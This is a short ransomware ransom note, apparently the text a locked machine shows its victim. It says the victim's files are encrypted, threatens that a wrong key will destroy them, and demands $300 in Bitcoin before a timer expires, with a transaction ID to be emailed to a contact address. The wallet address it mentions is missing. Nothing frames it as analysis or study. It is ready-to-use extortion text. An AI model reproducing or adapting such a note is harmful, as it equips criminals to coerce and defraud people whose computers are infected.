• What Happened To My Computer? All of your files have been encrypted and your computer is locked. Do not waste your time trying to guess the decryptor.
• Can I Recover My Files? Yes, if you pay before the timer is up you will be provided with a decryption key which will restore your files. Using an incorrect decryption key will fuck up ALL files.
• How Do I Pay? To pay you must purchase 300$ worth of Bitcoin and send it to the wallet address below. You can purchase Bitcoin online or at an Bitcoin ATM near you. (https://www.google.com/maps?q=bitcoin+atm)
• How To Get Decryption Key? Once paid email your transaction ID to - me@protonmail.com and you will be provided with a decryption key.
